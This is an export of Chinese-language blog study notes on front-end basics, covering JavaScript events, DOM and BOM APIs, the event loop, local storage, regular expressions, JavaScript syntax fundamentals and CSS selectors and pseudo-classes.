document.querySelect(&#x27;.div&#x27;)DOMObj.addEventListener(&#x27;click&#x27;, function (e)&#123; e.stopPropagation()&#125;) 注意：此方法可以阻断事件的流动传播，不光会阻止冒泡，在驳货阶段也有效 接触绑事件 DOM L0级的事件由于存在覆盖现象，因此直接使用： btn.onclick = null 即可 而DOM L2级事件需要使用新的方法removeEventListener 12target.removeEventListener(type, listener, [options])target.removeEventListener(type, listener, [useCpature]) **注意：**匿名函数无法被解绑 事件委托 事件委托是一种利用事件流的特性解决一些开发需求的技巧 优点：减少注册次数，提高程序性能 原理：利用事件冒泡的特性 给父元素注册事件，则触发子元素的事件后，会冒泡到父元素身上，变为触发父元素的事件 父元素可以使用事件对象中的e.target来获取到事件的具体触发对象 还可以通过e.traget.tagName获取到对象的标签名 组织默认行为 使用e.preventDefault()方法来组织默认行为 其他事件 页面加载事件 页面完全加载完成后，会触发load事件 作用：加载外部资源（如图片、外联CSS、JS）加载完毕时触发的事件 原因： 即有时需要等待页面资源全部加载完成再处理一些事情 老代码喜欢把JS写在head中，这是直接找DOM元素是找不到的 操作： 给window添加load事件以实现 window.addEventListener('load', function()&#123;&#125;) 还可以针对某些个体元素添加 此外还有DOMContentLoaded事件，无需等待样式表、图像等完全加载，只需要DOM加载完成即可触发 作用：监听页面DOM加载完毕 给document添加这一事件 document.addEventListener('DOMContentLoaded', function()&#123;&#125;) 元素滚动事件 滚动条滚动的时候触发的事件 监听整个页面的滚动：window.addEventListener('scroll', function()&#123;&#125;) 也可以给某个元素添加 如果要确定滚动发生了多少，则可以使用如下属性： DOMObj.scrollLeft、DOMObj.scrollTop 选取被卷去的大小 获取元素内容往左往上滚出去看不到的距离 两个属性均可读写 获取的指为Number类型 需要注意的是，如果需要确定整个页面滚动了多少，则需要访问html标签的scrollTop，此时应该通过：document.documentElement来获取到html标签 页面滚动除了给scrollTop赋值外，还可以使用scrollTo()方法 elementObj.scrollTo(x,y) 其中x，y分别代表x轴和y轴的滚动距离单位为px 页面尺寸事件 在窗口大小改变时候触发的事件：resize window.addEventListener('resize', function()&#123;&#125;) 检测屏幕尺寸 clientWidth，clientHeight let w = document.documentElement.clientWidth 这一方法用于获取可见部分的高度，包含padding**（不包含border、margin、滚动条等** offsetWidth，offsetHeight 获取元素的自身高度，包含自身设置的高度、padding、border 如果盒子是隐藏的，则结果为0 获取元素距离自己定位父级元素的左上距离 是只读属性 获取元素位置 element.getBoundingClientRect() 该方法返回元素的大小及其相对于视口的位置 相对于视口意味着页面滑动的时候位置会发生改变 属性 作用 说明 scrollTop和scrollLeft 被卷去的头部和左侧 配合页面滚动使用，可读写 clientWidth和clientHeight 获得元素宽度和高度 不包含border、margin、滚动条。用于js获取元素大小 offsetWidth和offsetHeight 获取元素宽度和高度 包含border、padding、滚动条。只读 offsetLeft和offestTop 获取元素距离自己定位父级元素的左、上距离 获取元素位置的时候使用。只读 getBoundingClientRect 获取元素相对于视口左上角的坐标 日期对象 用来表示事件的对象，可以得到当前系统时间 实例化 使用new关键字来创建对象的方法叫做实例化 例如获取当前时间： const date = new Date() 获取指定时间 const date = new Date('2008-8-8 08:30:00') 事件对象方法 通常日期对象返回的数据无法直接使用，因此需要一些方法来获取格式更为简单的时间信息： 方法 使用 说明 getFullYear() 获得年份 2023 getMonth() 获得月份 0~11 getDate() 获得日期 不同月份取值不同（0~31） getDay() 获得星期 0~6(周日是0) getHours() 获得小时 0~23 getMinutes() 获得分钟 0~59 getSeconds() 获得秒 0~59 时间戳 时间戳是一个毫秒数，是从1970年1月1日起到目前为止的毫秒数，是一种特殊的时间计量方式，即时间的存档点 这一方式的出现是为了更方便的对时间进行计算，由于时间中包含年月日时分秒，这些量的进制和单位并不相同，于是时间戳就将他们统一单位以便计算。 于是得到以下计算方式： 将来时间戳 - 现在时间戳 = 剩余毫秒数 剩余毫秒数转换为剩余时间的时分秒就是倒计时 获得时间戳的三种方法： getTime() 必须先实例化Date对象 +new Date():⭐ 本质就是将Date对象转化为数字 +new Date('2022-4-1 18:30:00') Date.now() 直接调用类方法，无需实例化 但该方法只能得到当前时间戳，而之前的方法可以返回指定时间的时间戳 关于秒数转时间： d = parseInt(总秒数 / 60 / 60 / 24); 计算天数 h = parseInt(总秒数 / 60 / 60 % 24); 计算小时 m = parseInt(总秒数 / 60 % 60); 计算分钟 s = parseInt(总秒数 % 60); 计算秒数 节点操作 DOM节点 DOM树上的每一个节点 节点类型： 元素节点⭐ 所有标签 html为根节点 属性节点 所有属性，例如href 文本节点 所有文本 其他 查找节点 父亲节点查找 使用parentNode属性查找当前节点的最近一级的父节点： element.parenNode 子节点查找⭐ childNodes 获取所有子节点、包括文本节点、注释节点 chidlren⭐ 返回所有元素节点 返回值为一个伪数组 parentElement.children 兄弟节点查找 nextElementSibling 下一个兄弟节点 previousElementSibling 上一个兄弟节点 增加节点 创建节点 document.createElement('标签名') 追加节点 parentElement.appendChild(element) 插入一个子元素在父节点的最后 parentElement.insertBefore(插入元素, 哪个元素之前) 插入一个子元素到父节点中某个子元素的前面 复制一个原有节点 element.cloneNode(bool) bool = true，则克隆包含后代节点（深拷贝 bool = false，则克隆时不包含后代节点（浅拷贝 默认为false 删除节点 DOM中删除元素必须通过父节点删除 parentElement.removeChild(要删除的节点) 如果不存在父子关系（亲父亲子）则删除不成功 删除节点和隐藏节点（display:none）有区别：隐藏的节点在DOM中仍然存在，但删除节点会从html中删除 移动端事件 移动端常见的事件有： touch事件 touch事件 说明 touchstart 当手指触摸到一个DOM时触发 touchmove 手指在一个DOM元素上滑动时触发 touched 手指从一个DOM元素上移开时触发 JS插件 swiper插件 swiper BOM 什么是BOM 浏览器对象模型 BOM即window对象 BOM和DOM的关系如下： 123456-window |__ nvigator |__ location |__ document //即DOM |__ history |__ screen window对象是一个全局对象，是JS中最顶级的对象 document、alert()、console.log()都是window的属性，基本BOM的属性和方法都是window对象的 window对象下的属性和方法在调用时可以省去window 所有通过var定义的全局作用域的变量、函数都会变成window对象的属性和方法 定时器-延时函数 JS中内置了一个能让代码延时执行的函数setTimeout setTimeout(回调函数, 等待毫秒数) 仅执行一次，可以理解为把一段代码延时执行，和setInterval函数一样都属于BOM，因此调用时可以省略window 清除延时函数clearTimeout(定时器ID) 延时函数需要等待，所以后面的代码会先执行 每一次调用延时函数都会产生一个新的延时器 JS执行机制 浏览器两个引擎： 渲染引擎 JS解释器（谷歌：V8引擎 经典面试题： 123456789101112131415console.log(1111)setTimeout(function() &#123; console.log(2222)&#125;, 1000)console.log(3333)// 输出结果是什么// 1111 3333 2222console.log(1111)setTimeout(function() &#123; console.log(2222)&#125;, 0)console.log(3333)// 输出结果是什么// 1111 3333 2222 JS的一大特点是：单线程 因为JS诞生时是为了操作DOM，对于某个DOM的进行添加和删除不能同事进行 所以所有任务都需要排队，前一个任务结束，才会执行后一个任务，这导致如果JS执行事件过长，会造成页面渲染不连贯，表现为页面渲染加载阻塞 因此JS出现了同步和异步，两者的区别在于在整条流水线上各个流程的执行顺序不同 同步 前一个任务结束后才能执行后一个任务 同步任务均在主线程上执行，形成一个执行栈 1234-执行栈 |__ console.log(1) |__ setTimeout(fn, 0) |__ console.log(2) 异步 做一个任务的同事可以同事处理其他事情 异步任务，JS的异步任务通过回调函数实现，通常有以下三种： 普通事件，如click、resize 资源加载，如load、error 定时器，如setInterval、setTimeout 异步任务将被添加到**任务队列（消息队列）**中 12-任务队列 |__ fn 事件循环 先执行执行栈中的同步任务 异步任务放入任务队列中 一旦执行栈中的所有同步任务执行完毕，系统将依次读取任务队列中的异步任务，于是被读取的异步任务结束等待状态，进入执行栈开始执行 思路就是：虽然JS只能处理单线程，但是JS的宿主（浏览器或Node）可以执行多线程，于是JS就将多线程任务委托给宿主执行 由于主线程不断重复获得任务、执行任务、再获取任务、再执行，所以这种机制被称为事件循环（event loop） location location对象拆分并保存了URL地址的各个组成部分 常用属性和方法： href属性获取完整的URL地址，对其赋值时用于地址的跳转 location.href = 'http://www.baidu.com' search属性获取地址中携带的参数，即符号？后面的部分 location.search hash属性获取地址中的哈希值，符号#后面的部分 location.hash vue路由也使用这一的方法，经常用于不刷新页面，来显示不同的页面内容 reload方法，用来刷新当前页面，传入参数true表示强制刷新 location.reload(true) navigator navigator对象记录了浏览器的相关信息 常用属性和方法： userAgent 检测浏览器的版本及平台 navigator.userAgent.match(/(Android);?[￥s￥/]+ ([￥d.]+)?/)来判断设备是否为安卓平台 navigator.userAgent.match(/(iPhone￥sOS)￥s([￥d_]+)/)来判断设备是否为苹果平台 history history对象主要管理历史记录，该对象与浏览器地址栏的操作相对应，如前进、后退、历史记录等等 常用属性和方法： back() 后退 forward() 前进 go(参数) 1前进，-1后退 一般再实际开发中很少使用，但会在一些OA办公系统中见到 本地存储 该对象将数据存储在用户浏览器中 设置、读取方便、刷新页面不会丢失 容量较大，sessionStorage和localStorage约5M左右 localStorage 将数据永久存在浏览器中，除非手动删除，否则关闭页面也会存在 特性： 可以多窗口共享（同一浏览器可共享）（涉及到跨域时无法访问 生命周期到手动删除为止 以键值对的形式存储使用 语法： 增 localStorage.setItem(key, value) 查 localStorage.getItem(key) 删 localStorage.removeItem(key) 改 localStoragte.setItem(key, value) 放key已经存在localStorage中时，调用set方法将会在原值上进行修改 **注意：**本地存储只能保存字符串 sessionStorage 特性： 生命周期为关闭浏览器窗口 在**同一个窗口（页面）**下数据可共享 以键值对的形式存储使用 用法与localStorage相同 存储复杂数据类型 由于本地存储只能存储字符串类型，无法直接存储复杂数据类型 因此需要将复杂数据类型转化为JSON字符串，再存储： JSON.stringify(data) 取出JSON字符串后，可以使用如下方法转化为JS对象： JSON.parse(JSONString) map()和join() map 可以遍历数组的同时处理数据，并返回新数组 const newArr = arr.map(function(ele, index) &#123;console.log(ele, index)//ele 为数组元素，index为索引号&#125;) map也称为映射，与for...each不同的是，map会返回新数组 join 该方法将数组中的所有元素转换为一个字符串 const string = arr.join('') 参数为一个字符串，表示分隔符，默认为‘,’ 正则表达式 用于匹配字符串中字符组合的模式，在JS中也是对象 语法 定义正则的方式有两种： const regObj = /表达式/ 匹配语法： 是否匹配 regObj.test(被检测的字符串) 匹配返回true，不匹配返回false 查找匹配 regObj.exec(被检测字符串) 匹配成果返回一个数组，否则返回null 元字符 正则语法中将字符分为两类： 普通字符 这些字符仅能描述他们本身例如字母和数字 即匹配时只能匹配与他们相同的字符 元字符 具有特殊含义的字符，具有更强大的的匹配功能 例如匹配所有小写字母的[a-z] 提高了正则的灵活性 提供更强大的匹配功能 元字符本身也有分类： 边界符（表示位置，开头和结尾 量词（表示重复次数 字符类（比如\\d 表示0~9，与[0-9]一致 边界符 主要有两个边界符： 边界符 说明 例子 ^ 表示匹配行首的文本（以谁开始 /^哈/.test('哈1') $ 表示匹配行尾的文本（以谁结束 /哈$/.test('2哈') 但当两个符号同时使用时/^哈$/ 代表精确匹配，只有‘哈’为true，其余均为false，即必须以一个哈开头一个哈结尾 量词 设定某个模式出现的次数 量词 说明 例子 * 0 or more /^哈*$/.test('哈哈') + 1 or more /^哈+$/.test('哈哈') ? 0 or 1 /^哈?$/.test('') {n} n /^哈&#123;4&#125;$/.test('哈哈哈哈') {n,} n or more /^哈&#123;4，&#125;$/.test('哈哈哈哈哈') {n, m} n ~ m /^哈&#123;4,6&#125;$/.test('哈哈哈哈哈哈') 注意：&#123;n,m&#125;的逗号左右不能有空格 字符类 []匹配字符集合 例如/[abc]/ 匹配串中只要包含abc中任意一个字符，即可返回true 但只能匹配一个，即/^[abc]$/匹配ab的结果将时false 此时可以使用量词限制，让他可以匹配两次/^[abc]&#123;2&#125;$/ 还可以用一个连字符表示范围/[a-z]/ 其中可以放很多范围比如/[a-zA-Z0-9]/，中间没有空格 [^a-z]表示除了小写字母 .表示匹配除了换行符之外的所有字符 预定义类：指某些常见模式的简写 预定义类 说明 \\d [0-9] \\D [^0-9] \\w [A-Za-z0-9_] \\W [^A-Za-z0-9_] \\s [\\t\\r\\n\\v\\f]匹配空格 \\S [^\\t\\r\\n\\v\\f]匹配非空格 其中空格包含换行符、制表符、空格符 例如日期匹配：/^\\d&#123;4&#125;-/d&#123;1,2&#125;-/d&#123;1,2&#125;/ 修饰符 约束正则执行的某些细节行为，比如是否区分大小写，是否支持多行匹配等 写法：/表达式/修饰符 i表示ignore，不区分大小写 g表示global，匹配所有满足的结果 写的顺序不影响结果 replace replace提供了一个使用正则匹配后将匹配到的字符串替换的方法： stringObj.replace(/regObj/, 'replaceText')","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"JS","slug":"JS","permalink":"http://enderxiao.github.io/tags/JS/"},{"name":"WebAPI","slug":"WebAPI","permalink":"http://enderxiao.github.io/tags/WebAPI/"}]},{"title":"前端JS补缺","slug":"前端JS补缺","date":"2023-07-07T02:28:17.000Z","updated":"2024-07-30T11:26:33.924Z","comments":true,"path":"2023/07/07/前端JS补缺/","permalink":"http://enderxiao.github.io/2023/07/07/%E5%89%8D%E7%AB%AFJS%E8%A1%A5%E7%BC%BA/","excerpt":"根据前端技能树补缺JS知识","text":"根据前端技能树补缺JS知识 JS简介 一种运行在客户端的编程语言，实现人机交互效果 作用有： 网页特效 表单验证 数据交互 服务端编程(node.js) JS组成： ECMAScript（JavaScript语法基础） 变量、分支语句、循环语句、对象 Web APIs DOM页面文档对象模型 操作文档，比如页面元素移动、大小、增删 BOM浏览器对象模型 操作浏览器，页面弹窗、检测窗口宽度、存储数据到浏览器 JS引入方式： 行内 onclick=&quot;alert()&quot;这样的写法即是行内JS 内部 写在&lt;/body&gt;的上面，即HTML的底部，这是因为浏览器会按照代码先后顺序加载HTML 外部 使用&lt;script src=&quot;...&quot;&gt;&lt;/script&gt;引入，script一旦设置了src属性，标签间的代码将会被忽略 JS注释： 单行/ 多行/* */ 结束符： 以;结束，但可写可不写 JS IO语法： 输出： document.write()向body内输出内容，其中使用的HTML语法也会被解析 alert弹出对话框 console.log()控制台打印输出 console.dir()控制台打印对象 输入： let name = prommpt()弹出框输入 字面量 例如字符串‘Hello World’，其中Hello World就是字符串字面量 变量 变量声明 Let关键字声明变量（ES6中定义局部变量）（ES5中使用var，但var声明的变量均为全局变量，导致作用域混乱污染代码） Let &amp; Var Var var变量的作用域时整个封闭函数 如果在var变量声明之前打印该变量，将会返回undefined var的一大作用是变量提升： 由于变量的声明总是在任意代码执行之前，所以Var变量认为在代码的任意位置声明变量总是等效于在代码的开头声明，即变量可以在被声明之前使用，这个行为被称作“hoisting”，就像把所有的变量声明都移动到了函数或者全局代码的开头 而这一特性也导致了var存在很多不方便的地方例如： 可以重复声明 变量均为全局变量 没有块级作用域 Let let允许声明一个作用域被限制在块作用域的变量 作用域规则： Let声明的变量的作用域只在其声明的块或子块内部 let在同一个函数或块作用域中重复声明同一变量会报错 暂时性死区TDZ 一个代码块开始知道代码执行到声明变量的行之前，let和const声明的变量都处于暂时性死区TDZ中 访问这些变量会导致ReferenceError错误 变量命名 JS的变量可以使用字母数字下划线和**$**符号，不能以数字开头 通常JS使用小驼峰命名法 常量 常量保存的值不允许重新赋值 常量声明的时候必须赋值 常量作用域与let相同 数据类型 JS是弱数据类型的语言：变量只有赋值后才知道变量类型 基本数据类型——变量中存储值，用栈存储 number +、-、*、/、% NaN: not a number代表计算错误 NaN是一个粘性的，无论与什么数字操作都是NaN 甚至NaN === NaN的值为False string boolean undefined：没有赋值 undefined + 1 = NaN null：赋值了但内容为空，是一个对象 null + 1 = 1 引用数据类型——变量中存储地址，在栈中存一个堆中的地址，实际数据在堆中存储 object 字符串 单双引号没有区别 反引号`也可以 推荐使用单引号 单引号中需要嵌套双引号，双引号同理，或者使用\\转义 模板字符串： 使用反引号表示 变量使用$&#123;&#125;包裹 数组 数组有序 数组字面量用[]表示 数组的声明：let arr = [item1, item2] 长度可访问：arr.length 增 arr.push()添加到数组末尾 arr.unshift()添加到数组开头 删 arr.pop()删除最后一个元素 arr.shift()删除第一个元素 arr.splice(start, deleteCount)删除一段 对象 一种无须数据集合 引用数据类型 对象声明 let obj = &#123;&#125; let obj = new Object() 增 obj.newAttr = newValue 删 delete obj.attr 改 obj.attr = newValue 查 obj.attr obj['attrName'] 对象方法： functionName(): function()&#123;&#125; 检测数据类型 使用typeof num（typeof()的缩写）查看某一变量的数据类型 数据类型转换 隐式类型转换 执行时编译器将自动进行类型转换： +号两边只要有一个字符串，就会把另一个转化为字符串 +号后跟一个字符串，将会把字符串转化为数字 -号会使空字符串转换为0 null经过数字转换后为0 undefined经过数字转换后为0 除了+以外的算术运算符都会把数据转化为数字类型 显式类型转换 Number()直接将字符串转换为数字 parseInt()保留整数，只保留字符串开头的能转化为整数的部分（小数也舍去） parseFloat保留字符串中开头的浮点数 Boolean类型转化 “”,0,undefined, null, false, NaN转化为bool类型均为False 其余为True 运算符 赋值运算符 = += -= *= /= %= 一元运算符 自增：++（前置后置与C语言相同） 前置先+再赋值 后置先赋值再+ 自减：– 比较运算符 &gt; &lt; &gt;= &lt;= == 只判断值：会发生隐式类型转换 undefined == null返回true ===：判断值和类型 !==：是否不全等 NaN不等于任何值，包括本身 尽量不要比较小数，因为有精度问题 不同类型之间的比较会引发隐式类型转换 开发中尽量使用=== 逻辑运算符 &amp;&amp; || ! 运算符优先级 （） 一元运算符： ++、–、! 算术运算符：先* / % 后 + - 关系运算符： &gt; &gt;= &lt; &lt;= 相等运算符：==、 !=、 === 、! == 逻辑运算符：先&amp;&amp;后|| 赋值运算符： = 逗号运算符：, 三元运算符 terms ? expression1 : expression2 语句 表达式：可以被求值的代码 语句：不一定有值 分支语句 if 单分支 双分支 多分支 三元运算符 switch(与C相同) switch判断分支时必须全等 循环语句 for for(变量起始; 终止条件; 变量变化) for…in for(let k in arr)返回数组下标，但值为字符串类型 for(let k in obj)&#123;console.log(obj[k])&#125; while 函数 作用域 全局作用域 作用于所有代码执行的环节（整个script标签内） 一个独立的JS文件 局部作用域 作用于函数内部的代码环境 也叫函数作用域 匿名函数 函数表达式 将匿名函数赋值给变量 通过变量调用函数 let fn = function()&#123;&#125; 立即执行函数 避免全局变量之间的污染 (function()&#123;console.log(11)&#125;)()使用这一写法时两个连续的立即执行函数间必须使用分号分隔 (function()&#123;&#125;()) Math内置对象 random 生成一个[0,1)之间的数 ceil 向上取整 floor 向下取整 round 四舍五入 对于负数要小心 max min pow abs …","categories":[{"name":"前端","slug":"前端","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/"},{"name":"JS","slug":"前端/JS","permalink":"http://enderxiao.github.io/categories/%E5%89%8D%E7%AB%AF/JS/"}],"tags":[{"name":"life","slug":"life","permalink":"http://enderxiao.github.io/tags/life/"},{"name":"JS","slug":"JS","permalink":"http://enderxiao.github.io/tags/JS/"},{"name":"JS基础","slug":"JS基础","permalink":"http://enderxiao.github.io/tags/JS%E5%9F%BA%E7%A1%80/"}]},{"title":"前端CSS知识点补缺","slug":"前端CSS知识点补缺","date":"2023-07-07T02:28:17.000Z","updated":"2024-07-30T11:26:33.923Z","comments":true,"path":"2023/07/07/前端CSS知识点补缺/","permalink":"http://enderxiao.github.io/2023/07/07/%E5%89%8D%E7%AB%AFCSS%E7%9F%A5%E8%AF%86%E7%82%B9%E8%A1%A5%E7%BC%BA/","excerpt":"根据前端技能树补缺CSS知识","text":"根据前端技能树补缺CSS知识 CSS基础 CSS语法 一门基于规则的语言 语法结构： 一个选择器开头 一对大括号 多个属性-值对的声明 @规则 供了关于 CSS 应该执行什么或如何表现的指令。有些@规则很简单，只有一个关键词和一个值。例如，@import 将一个样式表导入另一个 CSS 样式表： 1@import &#x27;styles2.css&#x27;; 可能遇到的一个常见的@规则是 @media，它被用来创建媒体查询。媒体查询使用条件逻辑来应用 CSS 样式。 在下面的例子中，样式表为 &lt;body&gt; 元素定义了一个默认的粉红色背景。然而，如果浏览器的视口宽于 30em，接下来的媒体查询则定义了蓝色背景。 123456789body &#123; background-color: pink;&#125;@media (min-width: 30em) &#123; body &#123; background-color: blue; &#125;&#125; CSS的如何运行 下面是浏览器加载网页的基本步骤（不同浏览器略有不同，但基本步骤都会包含）： 浏览器载入HTML文件 将HTML转化为一个DOM（Document Object Model），DOM 是文件在计算机内存中的表现形式 浏览器拉取HTML相关资源，例如：图片、视频、CSS样式，稍后会处理JS 浏览器解析CSS，根据选择器类型分到不同的桶，浏览器通过这些桶找到不同的选择器，将不同的规则（基于选择器的规则，如元素选择器、类选择器、id 选择器等）应用到DOM节点中并添加节点依赖的样式（这个中间步骤称为渲染树）。 上述的规则应用于渲染树之后，渲染树会依照应该出现的结构进行布局。 网页展示在屏幕上（这一步被称为着色 DOM 一个DOM有一个树形结构，标记语言中的每一个元素、属性、以及每一段文字都对应着结构树中的一个节点（Node/DOM 或 DOM node） 当你使用浏览器 F12 调试的时候你需要操作 DOM 以查看使用了哪些规则 以下列 HTML 代码为例： 123456&lt;p&gt; Let&#x27;s use: &lt;span&gt;Cascading&lt;/span&gt; &lt;span&gt;Style&lt;/span&gt; &lt;span&gt;Sheets&lt;/span&gt;&lt;/p&gt; 在这个 DOM 中，&lt;p&gt;元素对应了父节点，它的子节点是一个 text 节点和三个对应了&lt;span&gt;元素的节点，SPAN节点同时也是他们中的 Text 节点的父节点。 12345678P├─ &quot;Let&#x27;s use:&quot;├─ SPAN| └─ &quot;Cascading&quot;├─ SPAN| └─ &quot;Style&quot;└─ SPAN └─ &quot;Sheets&quot; CSS选择器 选择器列表 使用,连接的多个选择器： 1234h1,.special &#123; color: blue;&#125; 但是在被组合起来以后，如果其中一个选择器有语法错误，那么整个规则都会失效，无论是h1还是这个 class 都不会被样式化。 选择器类型 类型选择器 1h1 &#123; &#125; 全局选择器 123* &#123; margin: 0;&#125; 利用全局选择器我们可以使CSS代码更衣读，例如，如果想选中&lt;article&gt;元素的第一个子元素加粗： 123article :first-child &#123;&#125; 但这一操作尝尝会与article:first-child混淆，后者选择了作为其他元素的第一子元素的&lt;article&gt;元素。 为了避免这种混淆，我们可以向:first-child选择器加入全局选择器，这样选择器所做的事情很容易就能看懂。选择器正选中&lt;article&gt;元素的任何第一子元素： 123article *:first-child &#123;&#125; 类（class）选择器 1.box &#123; &#125; 此外我们还可以指向特定元素的类 1234567span.highlight &#123; background-color: yellow;&#125;h1.highlight &#123; background-color: pink;&#125; id选择器 1#unique &#123; &#125; 标签属性选择器 这组选择器根据一个元素上的某个标签的属性的存在以选择元素的不同方式： 1a[title] &#123; &#125; 或者根据一个有特定值的标签属性是否存在来选择： 1a[href=&quot;https://example.com&quot;] &#123; &#125; 存否和值选择器 选择器 示例 描述 [*attr*] a[title] 匹配带有一个名为attr的属性的元素——方括号里的值。 [*attr*=*value*] a[href=&quot;https://example.com&quot;] 匹配带有一个名为attr的属性的元素，其值正为value——引号中的字符串。 [*attr*~=*value*] p[class~=&quot;special&quot;] 匹配带有一个名为attr的属性的元素，其值正为value，或者匹配带有一个attr属性的元素，其值有一个或者更多，至少有一个和value匹配。注意，在一列中的好几个值，是用空格隔开的。 `[attr =value]` `div[lang 子字符串匹配选择器 选择器 示例 描述 [attr^=value] li[class^=&quot;box-&quot;] 匹配带有一个名为attr的属性的元素，其值开头为value子字符串。 [attr$=value] li[class$=&quot;-box&quot;] 匹配带有一个名为attr的属性的元素，其值结尾为value子字符串 [attr*=value] li[class*=&quot;box&quot;] 匹配带有一个名为attr的属性的元素，其值的字符串中的任何地方，至少出现了一次value子字符串。 大小写敏感 如果想在大小写不敏感的情况下，匹配属性值的话，你可以在闭合括号之前，使用i值。 123li[class^=&quot;a&quot; i] &#123; color: red;&#125; 伪类与伪元素 伪类 伪类是选择器的一种，它用于选择处于特定状态的元素，比如当它们是这一类型的第一个元素时，或者是当鼠标指针悬浮在元素上面的时候。它们表现得会像是你向你的文档的某个部分应用了一个类一样，帮你在你的标记文本中减少多余的类，让你的代码更灵活、更易于维护。 伪类就是开头为冒号的关键字： 1:pseudo-class-name 用户行为伪类 一些伪类只会在用户以某种方式和文档交互的时候应用。这些用户行为伪类，有时叫做动态伪类，表现得就像是一个类在用户和元素交互的时候加到了元素上一样。案例包括： :hover :forcus 伪元素 伪元素以类似方式表现，不过表现得是像你往标记文本中加入全新的 HTML 元素一样，而不是向现有的元素上应用类。伪元素开头为双冒号::。 1234article p::first-line &#123; font-size: 120%; font-weight: bold;&#125; 备注： 一些早期的伪元素曾使用单冒号的语法，所以你可能会在代码或者示例中看到。现代的浏览器为了保持后向兼容，支持早期的带有单双冒号语法的伪元素。 伪类用于样式化一个元素的特定状态 1a:hover &#123; &#125; 伪元素即选择一个元素的某个部分而不是元素自己，例如::first-line将选择一个元素中的第一行 1p::first-line &#123; &#125; 伪类和伪元素的组合 1234article p:first-child::first-line &#123; font-size: 120%; font-weight: bold;&#125; 生成内容：::before和::after 有一组特别的伪元素，它们和content属性一同使用，使用 CSS 将内容插入到你的文档中中。 你能用这些插入一个文本字符串，和在下面的实时示例里那样。试着改变content属性的文本值，看看输出是怎么改变的。你也能改变::before伪元素为::after，看到这段文本插入到了元素的末尾而不是开头。 还可以用来插入一些图形： 12345678.box::before &#123; content: &quot;&quot;; display: block; width: 100px; height: 100px; background-color: rebeccapurple; border: 1px solid black;&#125; 注意事项 使用CSS插入文本是不推荐的，以为对于一些屏幕阅读器来说，这些文本是不可见的，而且对于未来别人的查找和编辑也是不方便的，更多的是用来插入图标 伪类参考表 选择器 描述 :active 在用户激活（例如点击）元素的时候匹配。 :any-link 匹配一个链接的:link和:visited状态。 :blank 匹配空输入值的``元素。 :checked 匹配处于选中状态的单选或者复选框。 :current (en-US) xxxxxxxxxx3 1input::placeholder {2 color: red3}css :default 匹配一组相似的元素中默认的一个或者更多的 UI 元素。 :dir 基于其方向性（HTMLdir属性或者 CSSdirection属性的值）匹配一个元素。 :disabled 匹配处于关闭状态的用户界面元素 :empty 匹配除了可能存在的空格外，没有子元素的元素。 :enabled 匹配处于开启状态的用户界面元素。 :first 匹配分页媒体的第一页。 :first-child 匹配兄弟元素中的第一个元素。 :first-of-type 匹配兄弟元素中第一个某种类型的元素。 :focus 当一个元素有焦点的时候匹配。 :focus-visible 当元素有焦点，且焦点对用户可见的时候匹配。 :focus-within 匹配有焦点的元素，以及子代元素有焦点的元素。 :future (en-US) 匹配当前元素之后的元素。 :hover 当用户悬浮到一个元素之上的时候匹配。 :indeterminate 匹配未定态值的 UI 元素，通常为复选框。 :in-range 用一个区间匹配元素，当值处于区间之内时匹配。 :invalid 匹配诸如&lt;input&gt;的位于不可用状态的元素。 :lang 基于语言（HTMLlang属性的值）匹配元素。 :last-child 匹配兄弟元素中最末的那个元素。 :last-of-type 匹配兄弟元素中最后一个某种类型的元素。 :left 在分页媒体 (en-US)中，匹配左手边的页。 :link 匹配未曾访问的链接。 :local-link (en-US) 匹配指向和当前文档同一网站页面的链接。 :is() 匹配传入的选择器列表中的任何选择器。 :not 匹配作为值传入自身的选择器未匹配的物件。 :nth-child 匹配一列兄弟元素中的元素——兄弟元素按照an+b形式的式子进行匹配（比如 2n+1 匹配元素 1、3、5、7 等。即所有的奇数个）。 :nth-of-type 匹配某种类型的一列兄弟元素（比如，&lt;p&gt;元素）——兄弟元素按照an+b形式的式子进行匹配（比如 2n+1 匹配元素 1、3、5、7 等。即所有的奇数个）。 :nth-last-child 匹配一列兄弟元素，从后往前倒数。兄弟元素按照an+b形式的式子进行匹配（比如 2n+1 匹配按照顺序来的最后一个元素，然后往前两个，再往前两个，诸如此类。从后往前数的所有奇数个）。 :nth-last-of-type 匹配某种类型的一列兄弟元素（比如，&lt;p&gt;元素），从后往前倒数。兄弟元素按照an+b形式的式子进行匹配（比如 2n+1 匹配按照顺序来的最后一个元素，然后往前两个，再往前两个，诸如此类。从后往前数的所有奇数个）。 :only-child 匹配没有兄弟元素的元素。 :only-of-type 匹配兄弟元素中某类型仅有的元素。 :optional 匹配不是必填的 form 元素。 :out-of-range 按区间匹配元素，当值不在区间内的的时候匹配。 :past (en-US) 匹配当前元素之前的元素。 :placeholder-shown 匹配显示占位文字的 input 元素。 :playing 匹配代表音频、视频或者相似的能“播放”或者“暂停”的资源的，且正在“播放”的元素。 :paused 匹配代表音频、视频或者相似的能“播放”或者“暂停”的资源的，且正在“暂停”的元素。 :read-only 匹配用户不可更改的元素。 :read-write 匹配用户可更改的元素。 :required 匹配必填的 form 元素。 :right 在分页媒体 (en-US)中，匹配右手边的页。 :root 匹配文档的根元素。 :scope 匹配任何为参考点元素的的元素。 :valid 匹配诸如&lt;input&gt;元素的处于可用状态的元素。 :target 匹配当前 URL 目标的元素（例如如果它有一个匹配当前URL 分段的元素）。 :visited 匹配已访问链接。 伪元素参考 选择器 描述 ::after 匹配出现在原有元素的实际内容之后的一个可样式化元素。 ::before 匹配出现在原有元素的实际内容之前的一个可样式化元素。 ::first-letter 匹配元素的第一个字母。 ::first-line 匹配包含此伪元素的元素的第一行。 ::grammar-error 匹配文档中包含了浏览器标记的语法错误的那部分。 ::selection 匹配文档中被选择的那部分。 ::spelling-error 匹配文档中包含了浏览器标记的拼写错误的那部分。 关系选择器 最后一组选择器可以将其他选择器组合起来，更复杂的选择元素。下面的示例用运算符（&gt;）选择了&lt;article&gt;元素的初代子元素： 1article &gt; p &#123; &#125; 后代选择器 使用空格隔开： 123.box p &#123; color: red;&#125; 子代关系选择器 1article &gt; p &#123; &#125; 邻接兄弟选择器 